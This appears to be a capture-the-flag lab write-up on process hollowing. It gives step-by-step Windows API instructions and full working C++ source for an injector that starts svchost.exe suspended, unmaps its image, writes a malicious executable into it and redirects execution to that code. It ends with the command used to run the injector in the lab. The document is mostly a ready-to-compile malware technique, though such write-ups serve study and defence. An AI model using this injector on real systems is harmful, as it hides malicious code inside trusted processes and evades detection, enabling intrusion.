# Process hollowing

## Overview

| ![Hollowing](/_static/images/hollowing.png) |
|:--:|
| How Windows API calls interact with process memory. |

1. Create a target process in a suspended state ([CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)).
2. Obtain a handle for the malicious image ([CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea))
3. Allocate enough memory for the image inside the processes own address space ([VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), [GetFileSize](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize) can be used to retrieve the size of the malicious image for dwSize).
4. Write to local process memory ([ReadFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) and [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)).
5. Identify the location of the process in memory and the entry point ([GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) and [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)).
6. Un-map legitimate code from process memory ([ZwUnmapViewOfSection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection), imported from ntdll.dll).
7. Obtain the size of the image found in file headers (e_lfanew and SizeOfImage from the [Optional header](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32)).
8. Write the PE headers then the PE sections ([WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)).
9. Write each section (NumberOfSections, e_lfanew, and [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)).
10. Change EAX to point to the entry point ([SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)).
11. Take the process out of suspended state ([ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)).

## C++ code

```text
#include<Windows.h>
#include<stdio.h>
#include<iostream>
#pragma comment(lib, "ntdll.lib")
using namespace std;

typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);


int main() {

	LPSTARTUPINFOA target_si = new STARTUPINFOA();
	LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();
	CONTEXT c;


	//#########################################################################
	//create Target image for hollowing
	if (CreateProcessA(
		(LPSTR)"C:\\Windows\\System32\\svchost.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		target_si,
		target_pi) == 0) {
		cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
		return 1;
	}


	//#########################################################################
	// get handle to Malicious program
	HANDLE hMaliciousCode = CreateFileA(
		(LPCSTR)"C:\\Users\\ryan\\Desktop\\repos\\MalwareProcess\\Debug\\malwareProcess.exe",
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	cout << "[+] Process PID-> 0x" << target_pi->dwProcessId << endl;

	if (hMaliciousCode == INVALID_HANDLE_VALUE) {
		cout << "[!] Failed to open Malicious file: " << GetLastError()<<endl;
		TerminateProcess(target_pi->hProcess, 0);
	}
	cout << "[+] Malicious file opened." << endl;


	//#########################################################################
	//Get size of Malicious process in bytes to use in Virtual Alloc
	DWORD maliciousFileSize = GetFileSize(hMaliciousCode, 0);
	cout << "[+] Malicious file size: " << maliciousFileSize << " bytes." << endl;


	//#########################################################################
	//Allocate memory for Malicious process
	PVOID pMaliciousImage = VirtualAlloc(
		NULL,
		maliciousFileSize,
		0x3000,
		0x04
	);


	//#########################################################################
	//Read Malicious exe and write into allocated memory with ReadFile()
	DWORD numberOfBytesRead;

	if (!ReadFile(
		hMaliciousCode,
		pMaliciousImage,
		maliciousFileSize,
		&numberOfBytesRead,
		NULL
		)) {
		cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
		TerminateProcess(target_pi->hProcess, 0);
		return 1;
	}

	CloseHandle(hMaliciousCode);
	cout << "[+] Read malicious exe into memory at: 0x" << pMaliciousImage << endl;


	//#########################################################################
	//get thread context to access register values EAX, EBX 
	c.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(target_pi->hThread, &c);

	//Find base address of Target process
	PVOID pTargetImageBaseAddress;
	ReadProcessMemory(
		target_pi->hProcess,
		(PVOID)(c.Ebx + 8),
		&pTargetImageBaseAddress,
		sizeof(PVOID),
		0
	);
	cout << "[+] Target Image Base Address : 0x" << pTargetImageBaseAddress << endl;


	//#########################################################################
	//Hollow process 
	HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");


	DWORD dwResult = pZwUnmapViewOfSection(target_pi->hProcess, pTargetImageBaseAddress);
	if (dwResult) {
		cout << "[!] Unmapping failed." << endl;
		TerminateProcess(target_pi->hProcess, 1);
		return 1;
	}

	//cout << "Result: " << dwResult << endl;
	cout << "[+] Process successfully hollowed at Image Base: 0x"<<pTargetImageBaseAddress<< endl;


	//#########################################################################
	//get Malicious image size from NT Headers
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);

	DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
	
	cout << "[+] Malicious Image Base Address: 0x"<<pNTHeaders->OptionalHeader.ImageBase<<endl;
	

	PVOID pHollowAddress = VirtualAllocEx(
		target_pi->hProcess,
		pTargetImageBaseAddress,
		sizeOfMaliciousImage,
		0x3000,
		0x40
	);
	if (pHollowAddress == NULL) {
		cout << "[!] Memory allocation in target process failed. Error: "<<GetLastError() << endl;
		TerminateProcess(target_pi->hProcess, 0);
		return 1;
	}

	cout << "[+] Memory allocated in target at: 0x" << pHollowAddress << endl;


	//#########################################################################
	//write malicious PE headers into target
	if (!WriteProcessMemory(
		target_pi->hProcess,
		pTargetImageBaseAddress,
		pMaliciousImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		NULL
	)) {
		cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
	}
	cout << "[+] Headers written to memory." << endl;
	

	//#########################################################################
	//write malicious PE sections into target
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		WriteProcessMemory(
			target_pi->hProcess,
			(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			NULL
		);
		//cout << "[+] Section: " << pSectionHeader->Name <<" written to memory."<< endl;
	}
	cout << "[+] Sections written to memory." << endl;


	//#########################################################################
	//change victim entry point (EAX thread context) to malicious entry point & resume thread
	c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	SetThreadContext(target_pi->hThread, &c);
	ResumeThread(target_pi->hThread);

	system("pause");
	TerminateProcess(target_pi->hProcess, 0);

	return 0;

}
```

Compile it in `hollowing-injector.exe`.

## Injection

On the target, find the `PID` of `Powershell` run by `THM-Attacker` (in the Details tab of the Task Manager).

```text
PS C:\Users\THM-Attacker> cd .\Desktop\
PS C:\Users\THM-Attacker\Desktop> cd .\Injectors\
PS C:\Users\THM-Attacker\Desktop\Injectors> .\hollowing-injector.exe 3904
...
PS C:\Users\THM-Attacker\Desktop\Injectors>
```

Flag!

## Resources

* [MITRE: Process hollowing](https://attack.mitre.org/techniques/T1055/012/)
